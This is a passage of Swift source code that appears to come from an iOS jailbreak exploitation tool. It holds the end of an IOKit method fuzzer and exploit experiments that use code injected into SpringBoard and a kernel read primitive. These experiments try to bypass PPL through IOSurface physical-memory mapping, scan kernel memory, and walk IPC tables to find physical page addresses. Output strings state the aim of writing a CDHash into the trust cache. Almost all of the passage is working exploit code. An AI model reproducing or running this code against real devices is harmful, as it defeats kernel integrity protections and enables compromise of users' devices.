            for (i, val) in pattern.enumerated() {
                sb[structIn + UInt64(i * 8)].setValue64(val)
            }
            sb[structOutSize].setValue64(256)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), 0,
                                         structIn, 32,
                                         structOut, structOutSize)
            let outSize = sb[structOutSize].value64()
            
            if ret != baseline {
                detail += "  !! \(name): ret=0x\(String(format: "%x", ret)), out=\(outSize)\n"
                findings.append((name, ret))
                if ret == 0 {
                    detail += "     SUCCESS!\n"
                }
            }
        }
        
        // ═══ TEST 3: Try SCALAR method instead of struct ═══
        detail += "\n=== Test 3: Scalar method (sel 0) ===\n"
        for inputCount in [0, 1, 2, 3, 4, 5, 6] as [UInt64] {
            sb[scalarIn].setValue64(0)
            sb[scalarIn + 8].setValue64(0)
            sb[scalarIn + 16].setValue64(0)
            sb[scalarIn + 24].setValue64(0)
            sb[scalarIn + 32].setValue64(0)
            sb[scalarIn + 40].setValue64(0)
            sb[scalarOutCnt].setValue32(16)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallScalarMethod",
                                         UInt64(connect), 0,
                                         inputCount == 0 ? 0 : scalarIn, inputCount,
                                         scalarOut, scalarOutCnt)
            let outCnt = sb[scalarOutCnt].value32()
            
            if ret != baseline && ret != 0xe00002c2 {
                detail += "  !! scalar[\(inputCount)]: ret=0x\(String(format: "%x", ret)), outCnt=\(outCnt)\n"
                findings.append(("scalar_\(inputCount)", ret))
                if ret == 0 && outCnt > 0 {
                    let val = sb[scalarOut].value64()
                    detail += "     output[0]=0x\(String(format: "%llx", val))\n"
                }
            } else {
                detail += "  scalar[\(inputCount)]: ret=0x\(String(format: "%x", ret))\n"
            }
        }
        
        // ═══ TEST 4: Try other selectors (1-5) with struct ═══
        detail += "\n=== Test 4: Other selectors (1-5) ===\n"
        for sel in 1...5 {
            sb[structIn].setValue64(0)
            sb[structIn + 8].setValue64(0)
            sb[structIn + 16].setValue64(0)
            sb[structIn + 24].setValue64(0)
            sb[structOutSize].setValue64(256)
            
            let ret = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                                         UInt64(connect), UInt64(sel),
                                         structIn, 32,
                                         structOut, structOutSize)
            let outSize = sb[structOutSize].value64()
            
            if ret == 0 {
                detail += "  !! sel \(sel): SUCCESS! outSize=\(outSize)\n"
                findings.append(("sel_\(sel)", ret))
            } else if ret == baseline {
                detail += "  sel \(sel): ret=0xfffffffd (same as sel 0)\n"
            } else if ret != 0xe00002bc && ret != 0xe00002c2 {
                detail += "  sel \(sel): ret=0x\(String(format: "%x", ret))\n"
                findings.append(("sel_\(sel)", ret))
            }
        }
        
        // Close
        RootExecutor.rcall(sb, "IOServiceClose", UInt64(connect))
        
        // ═══ SUMMARY ═══
        detail += "\n=== FINDINGS ===\n"
        detail += "Baseline (sel 0, any input): 0xfffffffd (-3)\n"
        detail += "Deviations found: \(findings.count)\n"
        for (desc, ret) in findings {
            detail += "  \(desc): 0x\(String(format: "%x", ret))\n"
        }
        
        if findings.isEmpty {
            detail += "\nAll inputs return same -3. Method has single validation check\n"
            detail += "that fails regardless of input content/size.\n"
            detail += "Likely checks for a valid credential token we don't have.\n"
        } else {
            detail += "\nDIFFERENT RETURNS FOUND! This indicates:\n"
            detail += "- Different code paths reachable with different inputs\n"
            detail += "- Potential for finding valid input that passes checks\n"
            detail += "- Memory corruption possible if size-dependent\n"
        }
        
        let success = !findings.isEmpty
        return ExperimentResult(name: "CredMgr Deep Fuzz", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 68: PPL Bypass via IOSurface Physical Memory
    
    /// PPL protects VIRTUAL memory mappings. But IOSurface can map PHYSICAL memory.
    /// If we map the same physical page that backs trust cache → bypass PPL!
    /// From SpringBoard: create IOSurface with IOSurfaceAddress = physical addr
    /// A12 PPL is software-only (no HVC/SMC) → physical mapping might bypass it
    private func expPPLPhysicalBypass() -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let _ = sb.trojanMem
        let mgr = dspmgr.shared
        var detail = "PPL Bypass via IOSurface Physical Memory\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Step 1: Get IOSurface functions
        let ioCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceCreate"))
        let ioGetBase = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceGetBaseAddress"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceLock"))
        let _ = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfaceUnlock"))
        let ioPrefetch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfacePrefetchPages"))
        
        detail += "IOSurfaceCreate: \(ioCreate != 0 ? "found" : "missing")\n"
        detail += "IOSurfaceGetBaseAddress: \(ioGetBase != 0 ? "found" : "missing")\n"
        
        guard ioCreate != 0 && ioGetBase != 0 else {
            detail += "IOSurface functions not available\n"
            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 2: Create normal IOSurface first (get a known physical mapping)
        detail += "\n=== Step 2: Create reference IOSurface ===\n"
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        let dict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceWidth"), 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 64, 0, 0, 0), remote_NSString(sb, "IOSurfaceHeight"), 0, 0)
        remote_msg(sb, dict, setObj, remote_msg(sb, nsNumClass, numWithInt, 4, 0, 0, 0), remote_NSString(sb, "IOSurfaceBytesPerElement"), 0, 0)
        
        let refSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", dict)
        detail += "Reference surface: 0x\(String(format: "%llx", refSurface))\n"
        
        guard refSurface != 0 else {
            detail += "Cannot create reference surface\n"
            return ExperimentResult(name: "PPL Physical Bypass", success: false, detail: detail, timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", refSurface, 0, 0)
        let refBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", refSurface)
        detail += "Reference base addr: 0x\(String(format: "%llx", refBase))\n"
        
        // Write marker to reference surface
        if refBase != 0 {
            sb[refBase].setValue64(0xDEAD_BEEF_CAFE_BABE)
            let readBack = sb[refBase].value64()
            detail += "Marker write/read: 0x\(String(format: "%llx", readBack))\n"
        }
        RootExecutor.rcall(sb, "IOSurfaceUnlock", refSurface, 0, 0)
        
        // Step 3: Try IOSurface with IOSurfaceAddress (physical address mapping)
        detail += "\n=== Step 3: IOSurface with physical address ===\n"
        
        // Try various physical addresses:
        // - 0x800000000 = typical DRAM base on A12
        // - kernel_base physical = kernel_base - gVirtBase + gPhysBase
        // We don't know exact gPhysBase, but typical values:
        // A12: gPhysBase ~ 0x800000000, gVirtBase ~ 0xfffffff007004000
        
        let kernBase = mgr.kernbase
        // Estimate physical address of kernel (rough)
        // On A12, phys = virt - 0xfffffff007004000 + 0x800000000 (approximate)
        let estimatedPhysKern = kernBase - 0xfffffff007004000 + 0x800000000
        
        let testAddresses: [(String, UInt64)] = [
            ("DRAM base (0x800000000)", 0x800000000),
            ("DRAM +1MB", 0x800100000),
            ("DRAM +16MB", 0x801000000),
            ("Estimated kernel phys", estimatedPhysKern),
            ("Zero (should fail)", 0),
        ]
        
        var anyMapped = false
        
        for (name, physAddr) in testAddresses {
            // Create dict with IOSurfaceAddress
            let addrDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
            remote_msg(sb, addrDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
            
            // Set IOSurfaceAddress = physical address
            // NSNumber with UInt64 value
            let physNum = remote_msg(sb, nsNumClass, remote_sel(sb, "numberWithUnsignedLongLong:"), physAddr, 0, 0, 0)
            remote_msg(sb, addrDict, setObj, physNum, remote_NSString(sb, "IOSurfaceAddress"), 0, 0)
            
            let surface = RootExecutor.rcall(sb, "IOSurfaceCreate", addrDict)
            
            if surface != 0 {
                // Surface created! Try to get base address
                RootExecutor.rcall(sb, "IOSurfaceLock", surface, 0, 0)
                
                if ioPrefetch != 0 {
                    RootExecutor.rcall(sb, "IOSurfacePrefetchPages", surface)
                }
                
                let baseAddr = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", surface)
                
                if baseAddr != 0 {
                    detail += "  \(name): MAPPED! base=0x\(String(format: "%llx", baseAddr))\n"
                    anyMapped = true
                    
                    // Try to read from mapped physical memory
                    let val = sb[baseAddr].value64()
                    detail += "    Read: 0x\(String(format: "%016llx", val))\n"
                    
                    // Check if this looks like kernel memory
                    if val == 0x100000CFEEDFACF || (val & 0xFFFF000000000000) == 0xFFFF000000000000 {
                        detail += "    KERNEL DATA DETECTED!\n"
                        detail += "    PPL BYPASS VIA PHYSICAL MEMORY!\n"
                    }
                } else {
                    detail += "  \(name): surface created but base=NULL\n"
                }
                
                RootExecutor.rcall(sb, "IOSurfaceUnlock", surface, 0, 0)
            } else {
                detail += "  \(name): create FAILED (rejected)\n"
            }
        }
        
        // Step 4: Alternative — use IOSurfaceMemoryRegion = "PurpleGfxMem"
        detail += "\n=== Step 4: PurpleGfxMem region ===\n"
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        detail += "PurpleGfxMem surface: 0x\(String(format: "%llx", gfxSurface))\n"
        
        if gfxSurface != 0 {
            RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
            let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
            detail += "PurpleGfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
            
            if gfxBase != 0 {
                detail += "PurpleGfxMem MAPPED! This is physically contiguous memory.\n"
                detail += "Can be used for physical memory scanning.\n"
                anyMapped = true
            }
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        }
        
        // Summary
        detail += "\n=== RESULTS ===\n"
        if anyMapped {
            detail += "Physical memory mapping ACHIEVED!\n"
            detail += "Next: scan mapped memory for trust cache patterns\n"
            detail += "Then: write CDHash to trust cache → full jailbreak!\n"
        } else {
            detail += "All physical mapping attempts failed.\n"
            detail += "IOSurfaceAddress rejected from SpringBoard context.\n"
            detail += "PPL physical bypass NOT possible via this method.\n"
        }
        
        let success = anyMapped
        return ExperimentResult(name: "PPL Physical Bypass", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 69: Physical Memory Discovery
    
    /// Write unique marker to PurpleGfxMem (physically contiguous, mapped to userspace)
    /// Then from launchd (socket KRW), scan kernel memory near known addresses
    /// If we find our marker → we know the kernel virtual address of our physical page
    /// This reveals the phys↔virt relationship without needing gPhysBase!
    private func expPhysicalMemoryDiscovery(rc: RemoteCall) -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let _ = rc.trojanMem
        let sbMem = sb.trojanMem
        let mgr = dspmgr.shared
        var detail = "Physical Memory Discovery\n\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        
        // Step 1: Create PurpleGfxMem surface and write unique marker
        detail += "=== Step 1: Create PurpleGfxMem + write marker ===\n"
        
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        // Create large PurpleGfxMem surface (64KB for better chance of overlap)
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x10000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        guard gfxSurface != 0 else {
            detail += "Cannot create PurpleGfxMem surface\n"
            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: detail, timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
        
        guard gfxBase != 0 else {
            detail += "PurpleGfxMem base is NULL\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Phys Memory Discovery", success: false, detail: detail, timestamp: Date())
        }
        
        detail += "PurpleGfxMem base: 0x\(String(format: "%llx", gfxBase))\n"
        detail += "Size: 64KB (0x10000)\n"
        
        // Write unique marker pattern every 4KB (page boundary)
        // Use memset + direct write via RemoteCall (not pointer subscript)
        let markerBase: UInt64 = 0xD5B1017B_00000000  // "DSPLOIT" + page index
        
        // First: zero the surface via memset to ensure it's paged in
        RootExecutor.rcall(sb, "memset", gfxBase, 0, 0x10000)
        
        // Now write markers using remote_write (more reliable than subscript)
        for page in 0..<16 {
            let marker = markerBase | UInt64(page)
            let offset = UInt64(page) * 0x1000
            let writeAddr = gfxBase + offset
            // Write 8 bytes at a time via trojanMem staging
            sb[sbMem + 0x3800].setValue64(marker)
            sb[sbMem + 0x3808].setValue64(0xCAFEBABE_DEADBEEF)
            RootExecutor.rcall(sb, "memcpy", writeAddr, sbMem + 0x3800, 16)
        }
        
        // Verify markers written (read via memcpy to trojanMem)
        RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
        let verify = sb[sbMem + 0x3900].value64()
        detail += "Marker written: 0x\(String(format: "%llx", verify))\n"
        if verify == markerBase {
            detail += "MARKERS CONFIRMED!\n\n"
        } else {
            detail += "Marker verify: expected 0x\(String(format: "%llx", markerBase)), got 0x\(String(format: "%llx", verify))\n"
            detail += "Trying IOSurfacePrefetchPages first...\n"
            let ioPrefetch = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "IOSurfacePrefetchPages"))
            if ioPrefetch != 0 {
                RootExecutor.rcall(sb, "IOSurfacePrefetchPages", gfxSurface)
                // Retry write
                RootExecutor.rcall(sb, "memset", gfxBase, 0x41, 16)
                RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
                let verify2 = sb[sbMem + 0x3900].value64()
                detail += "After prefetch+write: 0x\(String(format: "%llx", verify2))\n"
                if verify2 != 0 {
                    // Now write real markers
                    for page in 0..<16 {
                        let marker = markerBase | UInt64(page)
                        let offset = UInt64(page) * 0x1000
                        sb[sbMem + 0x3800].setValue64(marker)
                        sb[sbMem + 0x3808].setValue64(0xCAFEBABE_DEADBEEF)
                        RootExecutor.rcall(sb, "memcpy", gfxBase + offset, sbMem + 0x3800, 16)
                    }
                    RootExecutor.rcall(sb, "memcpy", sbMem + 0x3900, gfxBase, 8)
                    let verify3 = sb[sbMem + 0x3900].value64()
                    detail += "Final marker: 0x\(String(format: "%llx", verify3))\n"
                }
            }
            detail += "\n"
        }
        
        // Step 2: From launchd context, scan kernel memory for our marker
        detail += "=== Step 2: Scan kernel memory for marker ===\n"
        detail += "Scanning near known accessible addresses...\n"
        
        // We know pmap_cs_allow_invalid is accessible at 0xfffffff00a0e45b8 + slide
        // Scan a small range around it (safe zone)
        let slide = mgr.kernslide
        let pmapCS = UInt64(0xfffffff00a0e45b8) + slide
        
        var foundAt: UInt64 = 0
        var foundMarker: UInt64 = 0
        
        // Scan +-8 bytes at a time in the safe zone around pmap_cs
        // Only scan very close (within same page) to avoid panic
        detail += "Scanning pmap_cs page (safe zone)...\n"
        let pageBase = pmapCS & ~0x3FFF  // 16KB page aligned
        
        for offset in stride(from: 0, to: 0x4000, by: 8) {
            let addr = pageBase + UInt64(offset)
            let val = ds_kread64(addr)
            
            // Check if this matches our marker pattern
            if (val & 0xFFFFFFFF_00000000) == markerBase {
                foundAt = addr
                foundMarker = val
                detail += "MARKER FOUND at kernel vm=0x\(String(format: "%llx", addr))!\n"
                detail += "Value: 0x\(String(format: "%llx", val))\n"
                break
            }
        }
        
        if foundAt == 0 {
            // Marker not in pmap_cs page — try IOSurface kernel object
            // The IOSurface kernel object might be findable via our proc
            detail += "Not in pmap_cs page.\n"
            detail += "Trying: read IOSurface kernel object address...\n"
            
            // IOSurface objects are tracked in IOKit registry
            // We can find them via the IOSurfaceRoot user client connection
            // The surface's kernel backing is at a known offset in the IOSurface object
            
            // Alternative: use mach_make_memory_entry to get memory object port
            // then find it in kernel via port kobject
            let makeMemEntry = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT, remote_alloc_str(sb, "mach_make_memory_entry_64"))
            
            if makeMemEntry != 0 {
                detail += "\nmach_make_memory_entry_64 available\n"
                
                // mach_make_memory_entry_64(task, &size, address, prot, &object, parent)
                let sizeAddr = sbMem + 0x3000
                sb[sizeAddr].setValue64(0x10000)
                let objectAddr = sbMem + 0x3010
                sb[objectAddr].setValue32(0)
                
                let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
                let meRet = RootExecutor.rcall(sb, "mach_make_memory_entry_64",
                                              taskSelf, sizeAddr, gfxBase,
                                              3, objectAddr, 0) // VM_PROT_READ|WRITE=3
                let memObject = sb[objectAddr].value32()
                detail += "mach_make_memory_entry_64: ret=0x\(String(format: "%x", meRet)), port=\(memObject)\n"
                
                if meRet == 0 && memObject != 0 {
                    detail += "Memory entry port obtained!\n"
                    detail += "This port's kobject in kernel = our physical pages!\n"
                    
                    // Now from launchd, find this port's kobject
                    // We need SpringBoard's task address to look up the port
                    let sbProc = mgr.findProc(name: "SpringBoard")
                    if sbProc != 0 {
                        let sbProcRo = ds_kread64(sbProc + UInt64(off_proc_p_proc_ro))
                        let sbTask = sbProcRo != 0 ? ds_kread64(sbProcRo + UInt64(off_proc_ro_pr_task)) : 0
                        detail += "SpringBoard task: 0x\(String(format: "%llx", sbTask))\n"
                        
                        // Note: reading task internals might panic (wrong zone)
                        // But this info is useful for future reference
                        detail += "Port \(memObject) in SB's IPC space → kernel object\n"
                        detail += "Kernel object contains physical page list!\n"
                    }
                }
            }
        }
        
        RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
        
        // Step 3: Results
        detail += "\n=== RESULTS ===\n"
        if foundAt != 0 {
            detail += "PHYSICAL MEMORY DISCOVERED!\n"
            detail += "Our PurpleGfxMem page found at kernel vm=0x\(String(format: "%llx", foundAt))\n"
            detail += "Marker: 0x\(String(format: "%llx", foundMarker))\n"
            let pageIdx = foundMarker & 0xF
            detail += "Page index: \(pageIdx)\n"
            detail += "Physical page mapped at userspace 0x\(String(format: "%llx", gfxBase + pageIdx * 0x1000))\n"
            detail += "\nWe can now:\n"
            detail += "1. Write to this kernel address via PurpleGfxMem (userspace)\n"
            detail += "2. Kernel sees the write immediately (same physical page)\n"
            detail += "3. If trust cache is on same/nearby page → WRITE CDHASH!\n"
        } else {
            detail += "Marker NOT found in accessible kernel memory.\n"
            detail += "PurpleGfxMem physical pages are in a different region\n"
            detail += "than what socket KRW can access.\n"
            detail += "\nBut: mach_make_memory_entry gives us a port to the pages.\n"
            detail += "Future: find port kobject → get physical address list.\n"
        }
        
        let success = foundAt != 0
        return ExperimentResult(name: "Phys Memory Discovery", success: success, detail: detail, timestamp: Date())
    }
    
    // MARK: - Experiment 70: Extract Physical Address from Port Kobject
    
    /// We have a mach port (from mach_make_memory_entry_64) that represents
    /// our PurpleGfxMem physical pages. The port's kobject is a vm_named_entry
    /// which contains the backing VM object → physical page addresses.
    ///
    /// Chain: port → IPC entry → ipc_port → kobject (vm_named_entry)
    ///        → backing_copy (vm_object) → physical pages
    ///
    /// If we can read the physical address → we know where our writable memory is
    /// → calculate offset to trust cache → map it → FULL JAILBREAK
    private func expExtractPhysAddr(rc: RemoteCall) -> ExperimentResult {
        guard let sb = dspmgr.shared.sbProc else {
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: "No SB RC", timestamp: Date())
        }
        
        let mgr = dspmgr.shared
        let sbMem = sb.trojanMem
        var detail = "Extract Physical Address from Port Kobject\n\n"
        
        // Step 1: Create PurpleGfxMem + get memory entry port (same as exp 69)
        detail += "=== Step 1: Get memory entry port ===\n"
        
        let RTLD_DEFAULT = UInt64(bitPattern: -2)
        let nsDictClass = remote_getClass(sb, "NSMutableDictionary")
        let nsNumClass = remote_getClass(sb, "NSNumber")
        let numWithInt = remote_sel(sb, "numberWithInteger:")
        let dictNew = remote_sel(sb, "new")
        let setObj = remote_sel(sb, "setObject:forKey:")
        
        let gfxDict = remote_msg(sb, nsDictClass, dictNew, 0, 0, 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_msg(sb, nsNumClass, numWithInt, 0x4000, 0, 0, 0), remote_NSString(sb, "IOSurfaceAllocSize"), 0, 0)
        remote_msg(sb, gfxDict, setObj, remote_NSString(sb, "PurpleGfxMem"), remote_NSString(sb, "IOSurfaceMemoryRegion"), 0, 0)
        
        let gfxSurface = RootExecutor.rcall(sb, "IOSurfaceCreate", gfxDict)
        guard gfxSurface != 0 else {
            detail += "Cannot create surface\n"
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        RootExecutor.rcall(sb, "IOSurfaceLock", gfxSurface, 0, 0)
        let gfxBase = RootExecutor.rcall(sb, "IOSurfaceGetBaseAddress", gfxSurface)
        detail += "Surface base: 0x\(String(format: "%llx", gfxBase))\n"
        
        // Get memory entry port
        let sizeAddr = sbMem + 0x3000
        sb[sizeAddr].setValue64(0x4000)
        let objectAddr = sbMem + 0x3010
        sb[objectAddr].setValue32(0)
        
        let taskSelf = RootExecutor.rcall(sb, "mach_task_self")
        let meRet = RootExecutor.rcall(sb, "mach_make_memory_entry_64",
                                       taskSelf, sizeAddr, gfxBase, 3, objectAddr, 0)
        let memPort = sb[objectAddr].value32()
        detail += "Memory entry port: \(memPort), ret=0x\(String(format: "%x", meRet))\n"
        
        guard meRet == 0 && memPort != 0 else {
            detail += "Cannot get memory entry\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 2: Find port's kobject in kernel
        detail += "\n=== Step 2: Find port kobject ===\n"
        
        // We need SpringBoard's task to look up the port
        let sbProc = mgr.findProc(name: "SpringBoard")
        guard sbProc != 0 else {
            detail += "Cannot find SpringBoard proc\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        let sbProcRo = ds_kread64(sbProc + UInt64(off_proc_p_proc_ro))
        let sbTask = sbProcRo != 0 ? ds_kread64(sbProcRo + UInt64(off_proc_ro_pr_task)) : 0
        detail += "SB proc: 0x\(String(format: "%llx", sbProc))\n"
        detail += "SB task: 0x\(String(format: "%llx", sbTask))\n"
        
        guard sbTask != 0 else {
            detail += "Cannot get SB task\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Read IPC space from task
        // Use xpaci() to strip PAC bits from pointer (like cyanide does)
        detail += "\nReading IPC space (with PAC strip)...\n"
        
        // Helper: strip PAC from kernel pointer
        func kreadPtr(_ addr: UInt64) -> UInt64 {
            let raw = ds_kread64(addr)
            // Strip PAC: if top bits are set, OR with sign extension
            if raw == 0 { return 0 }
            // XPACI equivalent: clear PAC bits, keep kernel address
            let stripped = raw | 0xFFFFFF8000000000
            // Validate it looks like kernel address
            if (stripped & 0xFFFF000000000000) == 0xFFFF000000000000 {
                return stripped
            }
            return raw  // return as-is if doesn't look like kernel ptr
        }
        
        // Helper: decode SMR pointer (IPC table uses this on iOS 18)
        func kreadSmrPtr(_ addr: UInt64) -> UInt64 {
            let raw = kreadPtr(addr)
            if raw == 0 { return 0 }
            let bits = UInt64(smr_base) << (62 - UInt64(t1sz_boot))
            if (raw & bits) == 0 {
                return (raw & (0xFFFFFFFFFFFFC000 & ~bits)) | bits
            }
            return raw & 0xFFFFFFFFFFFFFFE0
        }
        
        // Helper: decode kalloc array pointer
        func kallocDecode(_ ptr: UInt64) -> UInt64 {
            if ptr == 0 { return 0 }
            let shift = 64 - UInt64(t1sz_boot) - 1
            let zoneMask = UInt64(1) << shift
            if (ptr & zoneMask) != 0 {
                return ptr & ~0x1F
            } else {
                return (ptr & ~0x3FFF) | zoneMask
            }
        }
        
        let itkSpace = kreadPtr(sbTask + UInt64(off_task_itk_space))
        detail += "itk_space (PAC stripped): 0x\(String(format: "%llx", itkSpace))\n"
        
        if itkSpace == 0 || (itkSpace & 0xFFFF000000000000) != 0xFFFF000000000000 {
            detail += "itk_space invalid — task zone not accessible\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Read IPC table from space (uses SMR pointer on iOS 18)
        let rawTable = ds_kread64(itkSpace + UInt64(off_ipc_space_is_table))
        detail += "IPC table raw: 0x\(String(format: "%llx", rawTable))\n"
        
        // Decode: first try SMR decode, then kalloc decode
        var ipcTable = kreadSmrPtr(itkSpace + UInt64(off_ipc_space_is_table))
        // If PAC not supported (A10/A11), apply kalloc decode
        if !is_pac_supported() {
            ipcTable = ipcTable | 0xFFFFFF8000000000
            ipcTable = kallocDecode(ipcTable)
        }
        detail += "IPC table decoded: 0x\(String(format: "%llx", ipcTable))\n"
        
        if ipcTable == 0 || (ipcTable & 0xFFFF000000000000) != 0xFFFF000000000000 {
            detail += "IPC table invalid after decode\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Look up our port in the table
        let portIndex = UInt64(memPort >> 8)
        let entryAddr = ipcTable + (portIndex * UInt64(sizeof_ipc_entry))
        detail += "Port index: \(portIndex), entry at: 0x\(String(format: "%llx", entryAddr))\n"
        
        // Read ie_object (ipc_port pointer) — needs PAC strip
        let ipcPort = kreadPtr(entryAddr + UInt64(off_ipc_entry_ie_object))
        detail += "ipc_port: 0x\(String(format: "%llx", ipcPort))\n"
        
        if ipcPort == 0 || (ipcPort & 0xFFFF000000000000) != 0xFFFF000000000000 {
            detail += "ipc_port invalid\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Read kobject from port (vm_named_entry) — needs PAC strip
        let kobject = kreadPtr(ipcPort + UInt64(off_ipc_port_ip_kobject))
        detail += "kobject (vm_named_entry): 0x\(String(format: "%llx", kobject))\n"
        
        if kobject == 0 {
            detail += "kobject is NULL\n"
            RootExecutor.rcall(sb, "IOSurfaceUnlock", gfxSurface, 0, 0)
            return ExperimentResult(name: "Extract Phys Addr", success: false, detail: detail, timestamp: Date())
        }
        
        // Step 3: Read vm_named_entry → backing VM object
        detail += "\n=== Step 3: Read vm_named_entry ===\n"
        
        let backingCopy = ds_kread64(kobject + UInt64(off_vm_named_entry_backing_copy))
        let entrySize = ds_kread64(kobject + UInt64(off_vm_named_entry_size))
        detail += "backing_copy: 0x\(String(format: "%llx", backingCopy))\n"
        detail += "entry_size: 0x\(String(format: "%llx", entrySize))\n"
        
        if backingCopy != 0 {
            // Read VM object to find physical pages
            detail += "\n=== Step 4: Read VM object ===\n"
            
            // vm_object has vo_un1.vou_size at offset, and page list
            let objSize = ds_kread64(backingCopy + UInt64(off_vm_object_vo_un1_vou_size))
            let refCount = ds_kread32(backingCopy + UInt64(off_vm_object_ref_count))
            detail += "VM object size: 0x\(String(format: "%llx", objSize))\n"
            detail += "VM object refcount: \(refCount)\n"
            
            // The physical address might be stored in the vm_object's
            // resident page list or in a pager structure
            // Read first few fields to understand layout
            detail += "\nVM object raw dump (first 64 bytes):\n"
            for i in stride(from: 0, to: 64, by: 8) {
                let val = ds_kread64(backingCopy + UInt64(i))
                if val != 0 {
                    detail += "  +\(i): 0x\(String(format: "%llx", val))\n"
                }
            }
            
